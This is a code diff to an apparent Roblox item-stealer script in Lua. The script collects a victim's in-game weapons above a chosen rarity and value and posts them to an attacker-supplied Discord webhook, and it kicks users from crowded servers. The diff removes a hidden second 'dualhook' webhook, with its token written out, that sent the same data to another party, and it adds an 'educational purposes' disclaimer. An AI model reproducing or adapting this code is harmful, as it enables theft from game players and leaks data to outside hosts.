@@ -1,5 +1,4 @@
-
-
+-- Using it public is not allow made for only educational purposes and private uses
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
@@ -8,12 +7,10 @@ end
 _G.scriptExecuted = true
 
 local users = _G.Usernames or {}
-local min_rarity = _G.min_rarity or "Common"
+local min_rarity = _G.min_rarity or "Rare"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or ""
-local dualhook_webhook = "https://discord.com/api/webhooks/1433048206001836064/LFCtg5xm6tdaKXf-BXRxUIbQwWbEoaM1Im1lyv0Eqn9qUHRGecpysHzDHfEXpCRo95nD"
-
 
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
@@ -34,31 +31,6 @@ if #Players:GetPlayers() >= 12 then
     plr:kick("Server is full. Please join a less populated server")
     return
 end
-
-local function sendToWebhooks(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local body = HttpService:JSONEncode(data)
-
-    local targets = { webhook, dualhook_webhook }
-    for _, url in ipairs(targets) do
-        task.spawn(function()
-            local ok, err = pcall(function()
-                request({
-                    Url = url,
-                    Method = "POST",
-                    Headers = headers,
-                    Body = body
-                })
-            end)
-            if not ok then
-                warn("Failed to send webhook to", url, "error:", err)
-            end
-        end)
-    end
-end
-
 
 local weaponsToSend = {}
 local Players = game:GetService("Players")
@@ -321,7 +293,14 @@ local function SendFirstMessage(list, prefix)
             }
         }}
     }
-    sendToWebhooks(data)
+
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
 local function SendMessage(sortedItems)
@@ -375,7 +354,13 @@ local function SendMessage(sortedItems)
         }}
     }
 
-    sendToWebhooks(data)
+    local body = HttpService:JSONEncode(data)
+    local response = request({
+        Url = webhook,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
 local tradegui = playerGui:WaitForChild("TradeGUI")
